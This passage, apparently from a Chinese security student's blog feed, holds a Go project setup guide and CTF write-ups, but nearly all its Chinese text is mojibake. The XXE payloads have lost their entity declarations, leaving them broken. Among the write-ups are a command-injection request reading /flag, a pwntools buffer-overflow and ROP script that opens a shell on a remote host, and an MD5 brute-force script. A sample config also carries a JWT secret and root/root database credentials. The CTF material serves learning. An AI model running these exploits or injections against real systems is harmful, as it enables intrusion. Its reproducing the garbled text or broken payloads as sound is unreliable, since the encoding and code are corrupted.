//æ£€æµ‹å®‰è£…æ˜¯å¦æˆåŠŸ</code></pre><p>åˆ°æ­¤å®‰è£…Goå°±ç®—å®Œæˆäº†</p><h3 id="Gitä¸‹è½½"><a href="#Gitä¸‹è½½" class="headerlink" title="Gitä¸‹è½½"></a>Gitä¸‹è½½</h3><p>æœ€ç®€å•çš„ä¸‹è½½æ–¹å¼</p><pre class=" language-lang-shell"><code class="language-lang-shell">apt-get install git</code></pre><p>è¿™ç§å®‰è£…æ–¹å¼ä¸æ˜¯å¾ˆå¥½</p><p>å…¶ä»–å®‰è£…æ–¹æ³•ä¹Ÿç™¾åº¦å¾—åˆ°ï¼Œè¿™é‡Œå°±ä¸å†™äº†</p><h3 id="æºç ä¸‹è½½"><a href="#æºç ä¸‹è½½" class="headerlink" title="æºç ä¸‹è½½"></a>æºç ä¸‹è½½</h3><pre class=" language-lang-txt"><code class="language-lang-txt"># ä¸‹è½½$ go get -u github.com/puti-projects/puti# ä½¿ç”¨Makefileæ¥æ„å»ºç¨‹åº$ cd $GOPATH/src/github.com/puti-projects/puti$ make</code></pre><p>æœ¬æ¬¡å®‰è£…æ˜¯åœ¨æˆ‘çš„Ubantu16.04çš„è™šæ‹Ÿæœºä¸Šï¼Œwindowsä¸‹å‡ºäº†å¾ˆå¤šé—®é¢˜ï¼Œæµªè´¹äº†æˆ‘å¾ˆå¤šæ—¶é—´ã€‚</p><h3 id="MySQLä¸‹è½½"><a href="#MySQLä¸‹è½½" class="headerlink" title="MySQLä¸‹è½½"></a>MySQLä¸‹è½½</h3><p>è¿™ä¸ªé¡¹ç›®éœ€è¦mysqlæ•°æ®åº“æ¥è¿è¡Œ</p><p>MySQLçš„å®‰è£…æ•™ç¨‹ <a href="https://blog.csdn.net/james_nan/article/details/82053430" target="_blank" rel="noopener">https://blog.csdn.net/james_nan/article/details/82053430</a></p><p>æ¥ä¸‹æ¥å°±æ˜¯æŠŠputiä¸‹é¢çš„sqlæ–‡ä»¶å¯¼å…¥åˆ°æ•°æ®åº“ä¸­</p><p>å…ˆå»ºå¥½æ•°æ®åº“</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ mysql -uroot -p$ create database db_puti</code></pre><p>å¯¼å…¥sqlæ–‡ä»¶</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ cd $GOPATH/src/github.com/puti-projects/puti/init/scheam/</code></pre><pre class=" language-lang-shell"><code class="language-lang-shell">$ mysql -uroot -p -B db_puti &lt; db_puti.sql</code></pre><h2 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h2><p>é…ç½®æ–‡ä»¶ä½äºconfigç›®å½•</p><p>æˆ‘ä»¬æ–°å»ºä¸€ä¸ªconfig.yamlæ–‡ä»¶ï¼Œåœ¨é‡Œé¢å†™å…¥</p><pre class=" language-lang-txt"><code class="language-lang-txt">runmode: release                 # å¼€å‘æ¨¡å¼, debug, release, testaddr: 8000                  # HTTPç»‘å®šç«¯å£name: puti              # API Serverçš„åå­—ping_url: http://127.0.0.1:8000   # pingServerå‡½æ•°è¯·æ±‚çš„APIæœåŠ¡å™¨çš„ip:portping_max_num: 10           # pingServerå‡½æ•°tryçš„æ¬¡æ•°jwt_secret: putidemojwtseCrect013keyideOgormlog: false# tlstls:  https_open: false  addr: 8080  cert: configs/server.crt  key: configs/server.key# loggerlog:  logger_file: logs/server.log  logger_max_size: 1024   logger_max_backups: 7  logger_max_age: 31 # databasedb:  name: db_puti  addr: 127.0.0.1:3306  username: root  password: root</code></pre><h2 id="å¯åŠ¨é¡¹ç›®"><a href="#å¯åŠ¨é¡¹ç›®" class="headerlink" title="å¯åŠ¨é¡¹ç›®"></a>å¯åŠ¨é¡¹ç›®</h2><pre class=" language-lang-shell"><code class="language-lang-shell">$ go run main.go</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203184956.png" alt="å±å¹•æˆªå›¾"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203184948.png" alt="å±å¹•æˆªå›¾"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ´µæ¯CTF easywebpayload</title>
      <link href="/2019/11/30/ctf/web/axb/"/>
      <url>/2019/11/30/ctf/web/axb/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy web"></a>easy web</h2><p>payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">POST /index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=ca\t%20/flag HTTP/1.1Host: 47.108.135.45:20270User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 307Origin: http://47.108.135.45:20270Connection: closeReferer: http://47.108.135.45:20270/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=1Upgrade-Insecure-Requests: 1a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> axbctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ¬å­¦å¹´å·¥ä½œè®¡åˆ’</title>
      <link href="/2019/11/29/unfinish-work/work/"/>
      <url>/2019/11/29/unfinish-work/work/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»»åŠ¡æ¸…å•"><a href="#ä»»åŠ¡æ¸…å•" class="headerlink" title="ä»»åŠ¡æ¸…å•"></a>ä»»åŠ¡æ¸…å•</h1><h2 id="ç½‘å®‰ä¹‹è·¯"><a href="#ç½‘å®‰ä¹‹è·¯" class="headerlink" title="ç½‘å®‰ä¹‹è·¯"></a>ç½‘å®‰ä¹‹è·¯</h2><ul><li>XMLå­¦ä¹ </li><li>SQLiç¯å¢ƒæ­å»ºå­¦ä¹ </li><li>GraphQL </li><li>å®Œæˆhackone101CTF</li><li>å®Œæˆhack the box</li><li>ã€Šç½‘ç»œç©ºé—´å®‰å…¨åŸºç¡€ã€‹</li><li>ã€Šå¯†ç å­¦ä¸ç½‘ç»œç©ºé—´å®‰å…¨ã€‹</li></ul><h2 id="åŒºå—é“¾å­¦ä¹ ä¹‹è·¯"><a href="#åŒºå—é“¾å­¦ä¹ ä¹‹è·¯" class="headerlink" title="åŒºå—é“¾å­¦ä¹ ä¹‹è·¯"></a>åŒºå—é“¾å­¦ä¹ ä¹‹è·¯</h2><ul><li>Go webå­¦ä¹ </li><li>ä»¥å¤ªåŠå­¦ä¹ </li><li>ã€Šç²¾é€šä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å¼€å‘ã€‹</li><li>å­¦ä¹ å¤ç°é»è·ƒæ˜¥çš„åšå®¢</li></ul><h2 id="å¿…å­¦"><a href="#å¿…å­¦" class="headerlink" title="å¿…å­¦"></a>å¿…å­¦</h2><ul><li>Docker</li></ul><h2 id="å­¦æ ¡è¦æ±‚å­¦ä¹ å†…å®¹"><a href="#å­¦æ ¡è¦æ±‚å­¦ä¹ å†…å®¹" class="headerlink" title="å­¦æ ¡è¦æ±‚å­¦ä¹ å†…å®¹"></a>å­¦æ ¡è¦æ±‚å­¦ä¹ å†…å®¹</h2><ul><li>HTML&amp;CSS</li><li>æ•°æ®ç»“æ„</li><li>Java Webç¨‹åºè®¾è®¡</li><li>python æ•°æ®åˆ†æ</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å—äº¬é‚®ç”µå¤§å­¦ NCTF åšé¢˜è®°å½•</title>
      <link href="/2019/11/27/ctf/web/nctf/"/>
      <url>/2019/11/27/ctf/web/nctf/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€éƒ¨åˆ†-Web"><a href="#ç¬¬ä¸€éƒ¨åˆ†-Web" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ† Web"></a>ç¬¬ä¸€éƒ¨åˆ† Web</h1><p>æœ¬ç€ä»CTFä¸­æ‰¾çŸ¥è¯†ç‚¹å­¦ä¹ çš„ç²¾ç¥ï¼Œè¿™å‘¨åˆå‚åŠ äº†å—äº¬é‚®ç”µå¤§å­¦çš„CTFæ¯”èµ›ï¼Œè¯´æ˜¯å¤–æ ¡å‰äºŒååæœ‰å¥–ï¼Œæ¯”èµ›çš„æ—¶å€™å‘ç°äº‹æƒ…å¹¶ä¸ç®€å•ï¼Œï¼Œï¼Œåªåšå‡ºæ¥äº†æ²¡å‡ é“é¢˜</p><h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p>è¿™é“é¢˜ä¸ä¸Šä¸€æ¬¡UNCTFæ–°æ˜Ÿèµ›çš„é‚£é“XMLç®€ç›´ä¸€æ¨¡ä¸€æ ·ï¼ˆUNCTFçš„WPè¿˜æ²¡å†™â€¦.ï¼‰</p><p>ä¸è¿‡é‚£é“é¢˜çš„flagæ˜¯æ”¾åœ¨flag.phpä¸­çš„</p><p>è¿™é“é¢˜ä»–ç›´æ¥ç»™äº† <strong>hint: flag in /flag</strong></p><p>è¿™å°±æ¯”è¾ƒç®€å•äº†ï¼Œæ¯•ç«Ÿç­¾åˆ°é¢˜ï¼Œä¹Ÿæ²¡æœ‰è¿‡æ»¤</p><p>BPæŠ“åŒ…ï¼ˆé¢˜ç›®å…³äº†ï¼Œå¦‚æœæœ‰å¤ç°çš„è¯å†æ¥æ”¾å›¾ï¼‰</p><p><strong>payload:</strong></p><pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="utf-8"?-->]&gt;<username>&amp;entityex;</username></code></pre><h2 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h2><p>è¿™é“é¢˜è·Ÿä¸Šé“é¢˜çš„ä»£ç æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯<strong>flag</strong>æ”¾çš„ä½ç½®ä¸ä¸€æ ·ï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥ï¼Œèµ›åçœ‹äº†å¤§ä½¬çš„WPåæ‰çŸ¥é“ï¼Œè¿™é“é¢˜è€ƒçš„æ˜¯æ‰¾å†…ç½‘çœŸå®åœ°å€ã€‚ã€‚</p><p>å­¦ä¹ åœ°å€  <a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a> </p><p>payloadï¼š</p><pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="UTF-8"?--> ]&gt;<user><username>&amp;xxe;</username><password>123</password></user></code></pre><pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="UTF-8"?--> ]&gt;<user><username>&amp;xxe;</username><password>123</password></user></code></pre><pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="UTF-8"?--> ]&gt;<user><username>&amp;xxe;</username><password>123</password></user></code></pre><h2 id="å‰©ä¸‹çš„ç­‰é¢˜ç›®å¤ç°å†å†™å§ï¼ŒTCL"><a href="#å‰©ä¸‹çš„ç­‰é¢˜ç›®å¤ç°å†å†™å§ï¼ŒTCL" class="headerlink" title="å‰©ä¸‹çš„ç­‰é¢˜ç›®å¤ç°å†å†™å§ï¼ŒTCL"></a>å‰©ä¸‹çš„ç­‰é¢˜ç›®å¤ç°å†å†™å§ï¼ŒTCL</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆéƒ½å¤§å­¦ç¬¬äºŒå±Šâ€œç„æ­¦æ¯â€åšé¢˜è®°å½•2</title>
      <link href="/2019/11/19/ctf/pwn/cdusec-ctf2/"/>
      <url>/2019/11/19/ctf/pwn/cdusec-ctf2/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬ä¸‰éƒ¨åˆ†-Pwn"><a href="#ç¬¬ä¸‰éƒ¨åˆ†-Pwn" class="headerlink" title="ç¬¬ä¸‰éƒ¨åˆ† Pwn"></a>ç¬¬ä¸‰éƒ¨åˆ† Pwn</h1><p>æœ¬æ¬¡pwnå°±ä¸€é“é¢˜ï¼Œä¹Ÿä¸éš¾ï¼Œä½†ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡åšpwnâ€¦</p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>æ‹¿åˆ°é¢˜ç›®ï¼ŒIDAèµ°ä¸€ä¸‹ï¼ˆ64ä½ï¼‰</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [sp+6h] [bp-Ah]@1  printf("tell me your name?", argv, envp);  read(0, &amp;buf, 0x64uLL);  return 0;}</code></pre><p>å…¸å‹çš„readæº¢å‡º</p><p>buf åªæœ‰0xAä¸ªå­—èŠ‚ï¼Œè€Œreadç¡®å¯ä»¥è¯»å–100ä¸ªå­—èŠ‚</p><p>è¿™å°±é€ æˆäº†æº¢å‡º</p><p>æˆ‘ä»¬å¯ä»¥æº¢å‡ºEBPåˆ°EIPä»è€Œæ§åˆ¶å‡½æ•°çš„è¿”å›åœ°å€(64ä½ä¸€èˆ¬æ˜¯8ä¸ªå­—èŠ‚)</p><p>è¿™æ—¶æˆ‘ä»¬å‘ç°</p><pre class=" language-lang-c"><code class="language-lang-c">int system_bin(){  return system("/bin/bash");}</code></pre><p>æ–°ç”Ÿèµ›å—ï¼Œä¸€åˆ‡æœ‰éƒ½æ˜¯é‚£ä¹ˆçš„è‡ªç„¶</p><p>æ‰¾åˆ°system_binå‡½æ•°çš„åœ°å€<strong>0x400577</strong></p><p>å†™å‡ºjç®€å•çš„payload</p><pre class=" language-lang-txt"><code class="language-lang-txt">'a'*0xA + 'a'*8 + system_addr=(0x400577)</code></pre><p>ç„¶åç¥­å‡ºæˆ‘ä»¬çš„pwntools</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python # -*- coding:utf-8 -*-from pwn import *#sh = remote('47.93.249.236',10010)system_addr=0x400577payload='a'* 18 +p64(system_addr)sh = process('./pwn')sh.sendline(payload)sh.interactive()</code></pre><p>æœ¬åœ°æµ‹è¯•æˆåŠŸ</p><p>å¥½ï¼Œä¿®æ”¹æäº¤ï¼Œå‡ºé—®é¢˜äº†</p><pre class=" language-lang-txt"><code class="language-lang-txt">sh: 1: /bin/bash: not found</code></pre><p>ç„¶åå°±åˆå»å­¦ä¹ ï¼Œä¿®æ”¹è„šæœ¬ï¼Œé—®å¤§ä½¬æ€ä¹ˆå›äº‹</p><p>ç»ˆäºæ‰¾åˆ°äº†</p><p>åŸæ¥æ˜¯å‡ºé¢˜äººåœ¨dockerä¸­æ²¡æœ‰å¸ƒç½®bash, åªå¸ƒç½®äº†sh</p><p>emmm,æ‡‚äº†</p><p>ä¿®æ”¹è„šæœ¬ï¼Œæ‰¾_systemçš„åœ°å€ï¼Œpop ret rdiçš„åœ°å€ï¼ˆ64ä½ä¸32ä½ä¸ä¸€æ ·ï¼‰</p><p>å¤§ä½¬çš„è§£é‡Š</p><pre class=" language-lang-txt"><code class="language-lang-txt">64ä½ç¨‹åºåœ¨è°ƒç”¨systemå‡½æ•°æ—¶ï¼Œå‚æ•°çš„ä¼ é€’æ–¹å¼å’Œ32ä½ä¸ä¸€æ ·ï¼Œ32ä½æ˜¯é€šè¿‡æ ˆä¼ å‚ï¼Œè€Œ64ä½é€šè¿‡ediå¯„å­˜å™¨ä¼ å‚ï¼Œæ‰€ä»¥è¿™æ—¶æˆ‘ä»¬çš„æ€è·¯å˜æˆå¦‚ä½•è¦†ç›–ediçš„å€¼ï¼Œé€šè¿‡åŸºæœ¬ropå°±å¯ä»¥åšåˆ°ï¼Œåˆ©ç”¨ç¨‹åºè‡ªå·±çš„å¸¦æœ‰pop rdi;pop rdiè¯­å¥æ˜¯å°†å½“å‰çš„æ ˆé¡¶å…ƒç´ ä¼ é€’ç»™ediï¼Œåœ¨æ‰§è¡Œpopè¯­å¥æ—¶ï¼Œåªè¦ä¿è¯æ ˆé¡¶å…ƒç´ æ˜¯â€/bin/shâ€çš„åœ°å€ï¼Œå¹¶å°†è¿”å›åœ°å€è®¾ç½®ä¸ºsystemã€‚</code></pre><p>emmm,å­¦åˆ°äº†</p><pre class=" language-lang-txt"><code class="language-lang-txt">ROPgadget --binary pwn --only "pop|ret" | grep "rdi"</code></pre><p>åœ¨kailé‡Œè¿è¡Œè¿™æ¡å‘½ä»¤å°±å¯ä»¥æ‰¾åˆ°popçš„åœ°å€</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *context.log_level='debug'pwn=remote('47.93.249.236',10010)elf=ELF('./pwn')        pop_addr=0x0000000000400633sys_addr=0x0000000000400460  #è·å–ç³»ç»Ÿå‡½æ•°åœ°å€sh_addr=elf.search('sh').next()   #è·å–'bin'å­—ç¬¦ä¸²åœ°å€payload= 'a'* 18 + p64(pop_addr)+p64(sh_addr) + p64(sys_addr)pwn.send(payload)pwn.interactive()pwn.close()</code></pre><p>æˆåŠŸgetshell,ç„¶åå°± ls,cat flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusec_Pwn_New_Star!}</code></pre><p>è¿˜æœ‰åœ¨bugku pwn4ä¸Šçœ‹åˆ°</p><pre class=" language-lang-txt"><code class="language-lang-txt">'$0'</code></pre><p>ä¹Ÿå¯ä»¥å½“ä½œbash,å› ä¸º</p><pre class=" language-lang-txt"><code class="language-lang-txt">'$0'</code></pre><p>å°±æ˜¯bashæœ¬èº«</p><h1 id="ç¬¬å››éƒ¨åˆ†-Misc"><a href="#ç¬¬å››éƒ¨åˆ†-Misc" class="headerlink" title="ç¬¬å››éƒ¨åˆ† Misc"></a>ç¬¬å››éƒ¨åˆ† Misc</h1><p>miscè¿™æ¬¡çš„æ¯”è¾ƒç®€å•ï¼Œéƒ½æ˜¯ä¸€äº›æ¯”è¾ƒåŸºç¡€çš„åŠ å¯†æ–¹å¼è§£å¯†æ–¹å¼ï¼Œä¸€å…±ä¸ƒé“é¢˜ã€‚</p><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p>æ ¹æ®é¢˜ç›®base16 base32 base64 è§£ä¸€éå°±å‡ºæ¥äº†</p><p>ç”¨åœ¨çº¿ç½‘ç«™è§£ç ä¹Ÿè¡Œï¼Œæˆ‘è¯•äº†ä¸€ä¸‹æ¬¡æ•°ä¸å¤šï¼Œæ‰€ä»¥å°±ç›´æ¥ç”¨ç½‘ç«™è§£ç äº†ï¼Œæ²¡å†™è„šæœ¬</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Cdu_sec_Base64}</code></pre><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>æ”¾è¿›kailé‡Œé¢ç”¨binwalk -e æå–ä¸€ä¸‹</p><p>å‘ç°ä¸€ä¸ªæ²¡æœ‰å¯†ç çš„å‹ç¼©åŒ…</p><p>é‡Œé¢çš„å†…å®¹æ˜¯</p><pre class=" language-lang-txt"><code class="language-lang-txt">%26%23113%3B%26%23119%3B%26%23108%3B%26%23114%3B%26%23123%3B%26%23744810295113%3B%26%2349%3B%26%23121%3B%26%23111%3B%26%2395%3B%26%2369%3B%26%23115%3B%26%2349%3B%26%23100%3B%26%23125%3Bw+h+a+t%27s%20t+h+e%20n+e+x+t%20a+f+t+e+r+t%20t+h+e+U+R+L</code></pre><p>è¿™ä¸€çœ‹å°±æ˜¯urlç¼–ç </p><p>ç„¶åè§£ç </p><pre class=" language-lang-txt"><code class="language-lang-txt">qwlr{ï¿½1yo_Es1d}w h a t's t h e n e x t a f t e r t t h e U R L</code></pre><p>è¿™åœ¨ä¸€çœ‹å°±æ˜¯Unicodeç¼–ç ï¼Œä¸è¿‡éœ€è¦æ”¹ä¸€ä¸‹</p><pre class=" language-lang-txt"><code class="language-lang-txt">qwlr{J0f_q1yo_Es1d}</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">qwlr{J0f_q1yo_Es1d}//è§£å‡ºæ¥è¿™ä¸ª</code></pre><p>ä¸åƒflagå•Š</p><p>å†æ¥ä¸€æ¬¡å‡¯æ’’è§£ç </p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Y0u_f1nd_Th1s}</code></pre><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>å°±è¿™çœŸçš„ç­¾åˆ°</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{welc0me_to_cdusec_Ctf}</code></pre><h2 id="é”®ç›˜å¯†ç "><a href="#é”®ç›˜å¯†ç " class="headerlink" title="é”®ç›˜å¯†ç "></a>é”®ç›˜å¯†ç </h2><p>é”®ç›˜åˆ’çº¿</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{CDUSEC}</code></pre><h2 id="å¤§åŠ›å‡ºå¥‡è¿¹"><a href="#å¤§åŠ›å‡ºå¥‡è¿¹" class="headerlink" title="å¤§åŠ›å‡ºå¥‡è¿¹"></a>å¤§åŠ›å‡ºå¥‡è¿¹</h2><p>zipå¯†ç çˆ†ç ´ ARCHPRå°±å¯ä»¥çˆ†ç ´</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Aestheticization_of_violence}</code></pre><h2 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h2><p>wireshark æµé‡åˆ†æå·¥å…·</p><p>è·Ÿè¸ªTCPæµé‡ï¼Œå°†æµè°ƒä¸º1</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{tcpip_is_awesome}</code></pre><h2 id="å¯†ç æ˜¯å•¥"><a href="#å¯†ç æ˜¯å•¥" class="headerlink" title="å¯†ç æ˜¯å•¥"></a>å¯†ç æ˜¯å•¥</h2><p>çŸ¥é“äº†å¯†ç md5å€¼çš„å‰å››ä½å’Œåä¸‰ä½å°±å¯ä»¥æ ¹æ®é¢˜ç›®å†™è„šæœ¬çˆ†ç ´äº†</p><p>è„šæœ¬å¦‚ä¸‹(python 2.7)</p><p>PSï¼šè„šæœ¬å†™çš„LOWï¼Œè¦çˆ†å¥½å‡ åˆ†é’Ÿï¼Œæ®è¯´å¤šçº¿ç¨‹ä¼šå¿«ç‚¹ï¼Œä½†ä¸ä¼šå†™ï¼Œæœ‰ç©ºåœ¨çœ‹çœ‹å§ã€‚</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python # -*- coding:utf-8 -*-import hashlibhead="b996"foot="3e2"word=''s="qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"for a in s:    for b in s:        for c in s:            for d in s:                for e in s:                    word=a+b+c+d+e                    mdd=word.encode()                    # print (word)                    tmp=hashlib.md5(mdd).hexdigest()                    # print(tmp)                    # if tmp[:4]==head:                    #     print(tmp)                    # print(tmp)                    # print(tmp[29:32])                    if tmp[29:32]==foot and tmp[:4]==head:                        print(tmp)                        break</code></pre><p>è®°å¾—å½“æ—¶çˆ†å‡ºæ¥ä¸¤ä¸ª</p><pre class=" language-lang-txt"><code class="language-lang-txt">b9966524dbef725a3ad170446855d3e2b99648ad338f83a9ace00e19f97b53e2</code></pre><p>å…·ä½“æ˜¯å“ªä¸€ä¸ªæˆ‘ä¹Ÿè®°ä¸æ¸…äº†ï¼Œå°±å½“æ˜¯ç¬¬ä¸€ä¸ªå§</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{FjcOy}</code></pre><h1 id="èµ›åæ€»ç»“"><a href="#èµ›åæ€»ç»“" class="headerlink" title="èµ›åæ€»ç»“"></a>èµ›åæ€»ç»“</h1><p>è¿™æ¬¡æ¯”èµ›æ²¡æœ‰å¯†ç å­¦ï¼Œæ€»ä½“éš¾åº¦æ¯”è¾ƒç®€å•ï¼Œé¢˜é‡ä¹Ÿä¸å¤§ï¼Œæ–°æ‰‹æœ‰è¶³å¤Ÿçš„æ—¶é—´æ¥æœç´¢èµ„æ–™å­¦ä¹ ï¼Œè¾›è‹¦å‡ºé¢˜å’Œç»´æŠ¤çš„å¸ˆå‚…ä»¬äº†ã€‚</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆéƒ½å¤§å­¦ç¬¬äºŒå±Šâ€œç„æ­¦æ¯â€åšé¢˜è®°å½•</title>
      <link href="/2019/11/18/ctf/web/cdusec-ctf/"/>
      <url>/2019/11/18/ctf/web/cdusec-ctf/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€éƒ¨åˆ†-web"><a href="#ç¬¬ä¸€éƒ¨åˆ†-web" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ† web"></a>ç¬¬ä¸€éƒ¨åˆ† web</h1><p>å¤§æ¦‚çœ‹äº†ä¸‹åŠ ä¸Šæœ€åä¸¤å¤©ä¸Šçš„é‚£ä¸€é“é¢˜ï¼Œæœ¬æ¬¡webä¸€å…±æœ‰ä¹é“é¢˜ï¼Œé¢˜ç›®ä¸æ˜¯å¾ˆéš¾ï¼ˆæ¯•ç«Ÿæ˜¯é¢å‘19çº§æ–°ç”Ÿçš„æ¯”èµ›ï¼‰ï¼Œä½†è¿˜æ˜¯è®°å½•ä¸€ä¸‹ï¼Œå›å¿†ä¸€ä¸‹ä¸Šä¸€å¹´çš„æƒ¨ç—›ç»å†â€¦.ï¼ˆè¢«å¤§ä½¬æ‰“è’™äº†ï¼‰ã€‚</p><p>ä¸è¦é—®ä¸ºä»€ä¹ˆéƒ½æ˜¯ä»£ç å’Œæ–‡å­—ï¼Œé—®å°±æ˜¯å›¾åºŠæ²¡æ­å¥½ï¼Œè¿˜åœ¨æµ‹è¯•ä¸­â€¦</p><h2 id="weekpassword"><a href="#weekpassword" class="headerlink" title="weekpassword"></a>weekpassword</h2><p>è¿™é¢˜ä»åå­—ä¸Šçœ‹å°±çŸ¥é“æ˜¯å¼±å£ä»¤ï¼Œç›´æ¥ç™¾åº¦å¼±å£ä»¤TOP1000ï¼Œæ”¾è¿›Bpé‡Œé¢è·‘ï¼Œè·‘å‡ºæ¥00000å°±æ˜¯å¯†ç 